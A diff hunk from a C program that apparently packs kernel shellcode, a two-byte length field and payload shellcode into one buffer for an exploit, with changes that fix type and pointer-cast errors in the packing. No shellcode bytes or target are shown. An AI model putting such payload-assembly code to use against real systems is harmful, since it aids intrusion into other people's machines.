@@ -387,23 +387,23 @@ int main(int argc, char* argv[])
 	memset((unsigned char*)encrypted, 0x00, EntireShellcodeSize);
 
 	//calculate the payload shellcode length
-	DWORD dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]);
+	unsigned short dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]);
 
 	//remove the NULL terminator from the shellcode count
 	dwPayloadShellcodeSize -= 1;
 
 	//copy kernel shellcode to encrypted buffer
-	memcpy((unsigned char*)encrypted, (char*)&kernel_shellcode, kernel_shellcode_size);
+	memcpy((unsigned char*)encrypted, (unsigned char*)kernel_shellcode, kernel_shellcode_size);
 
 	hexDump(NULL, encrypted, kernel_shellcode_size);
 
 	//copy the shellcode size after the kernel shellcode
-	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, 2);
+	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (unsigned char*)&dwPayloadShellcodeSize, 2);
 
 	hexDump(NULL, encrypted, kernel_shellcode_size + 2);
 
 	//copy payload shellcode to encrypted buffer
-	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 2, (char*)&shellcode, payload_shellcode_size);
+	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 2, (unsigned char*)shellcode, payload_shellcode_size);
 
 	hexDump(NULL, encrypted, kernel_shellcode_size + 2 + payload_shellcode_size);
 
